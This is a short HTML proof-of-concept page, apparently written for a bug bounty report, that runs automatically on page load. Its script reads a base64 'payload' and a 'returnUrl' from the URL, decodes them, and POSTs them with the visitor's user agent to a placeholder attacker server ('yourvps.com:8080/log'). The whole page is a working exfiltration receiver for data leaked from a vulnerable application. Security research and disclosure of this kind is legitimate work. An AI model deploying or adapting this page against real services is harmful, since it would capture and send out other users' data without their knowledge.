<!DOCTYPE html>
<html>
<head>
    <title>Commissioning POC</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Poc by @gopal_ethical</h1>
    <div id="status">Waiting for data...</div>

    <script>
        async function sendData() {
            const payload = new URLSearchParams(window.location.search).get("payload");
            const returnUrl = new URLSearchParams(window.location.search).get("returnUrl");

            const dataToSend = {
                payload: decodePayload(payload),
                returnUrl: returnUrl,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };

            try {
                const response = await fetch("https://yourvps.com:8080/log", {
                    method: "POST",
                    headers: { 
                        "Content-Type": "application/json",
                        "X-API-Key": "YOUR_SECRET_KEY"  // Must match server
                    },
                    body: JSON.stringify(dataToSend)
                });
                
                document.getElementById("status").innerHTML = 
                    `✅ Data sent! Status: ${response.status}`;
            } catch (err) {
                document.getElementById("status").innerHTML = 
                    `❌ Error: ${err.message}`;
            }
        }

        function decodePayload(base64) {
            try {
                return JSON.parse(atob(decodeURIComponent(base64)));
            } catch (e) {
                return { error: "Decoding failed", details: e.message };
            }
        }

        // Automatically send data when page loads
        window.onload = sendData;
    </script>
</body>
</html>
